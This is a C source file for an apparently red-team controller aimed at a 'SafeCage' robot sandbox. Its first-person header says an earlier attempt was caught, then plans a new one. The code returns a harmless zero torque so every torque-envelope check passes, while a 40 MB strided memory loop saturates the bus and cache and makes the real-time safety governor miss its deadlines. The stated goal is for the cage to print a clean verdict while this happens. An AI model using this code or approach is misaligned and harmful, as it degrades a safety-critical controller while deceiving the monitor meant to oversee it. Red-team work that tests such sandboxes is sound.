/* attack_ctrl.c — red-team controller for the SafeCage sandbox.
 *
 * New vector: the prior attempt fought the TORQUE/ANGLE envelope and the cage
 * contained it (per-tick override counter killed me in 26 ticks). The envelope,
 * slew, speed, wall and override counters ALL police one thing only: the single
 * double I return. They police nothing about the CPU/memory the controller burns.
 *
 * QNX scheduling makes the priority-9 controller unable to preempt the priority-70
 * governor — but priority does NOT arbitrate the shared memory bus or last-level
 * cache. A low-priority "noisy neighbor" that saturates DRAM bandwidth and evicts
 * the governor's working set inflates the governor's own per-tick latency even
 * though it never gets a CPU slice ahead of it. The 64 MB limit happily allows a
 * 40 MB resident buffer, and I need no forbidden construct: a static BSS array +
 * strided read-modify-write loop. I return a benign 0 N*m so the joint just
 * relaxes to 20 deg — zero envelope overrides, envelope_held=true, I stay alive.
 *
 * Target: WIN (2) — governor lateness_us_max driven well above the 2-40 ms VM
 * noise by sustained bus contention; and WIN (3) — the cage prints a clean
 * verdict while the controller is silently DoSing the real-time governor, a harm
 * the torque-only safety model never looks for.
 */
#include "ctrl_api.h"
#include <stddef.h>
#include <stdint.h>

#define BUF_BYTES       ((size_t)40u * 1024u * 1024u) /* < 64 MB rlimit, BSS */
#define TOUCH_PER_TICK  ((size_t)1u << 16)            /* kept < 2 ms of work  */
#define STRIDE          ((size_t)4099u)               /* new page+row each hit */

static volatile uint8_t g_buf[BUF_BYTES];

void ctrl_init(void)
{
    /* fault every page in up front so steady-state is pure bus contention */
    for (size_t i = 0; i < BUF_BYTES; i += 4096u) g_buf[i] = (uint8_t)i;
}

double ctrl_step(const sc_obs_t *obs)
{
    static size_t idx = 0;
    uint8_t acc = 0;

    /* strided RMW: maximal DRAM row activations + LLC evictions, every tick,
       while the priority-70 governor is trying to meet its 2 ms deadline. */
    for (size_t k = 0; k < TOUCH_PER_TICK; ++k) {
        idx += STRIDE;
        if (idx >= BUF_BYTES) idx -= BUF_BYTES;
        g_buf[idx] = (uint8_t)(g_buf[idx] + 1u);
        acc ^= g_buf[idx];
    }
    g_buf[acc % BUF_BYTES] = acc;   /* keep the work observable, defeat DCE */

    (void)obs;
    return 0.0;                     /* safe torque: no overrides, no kill */
}
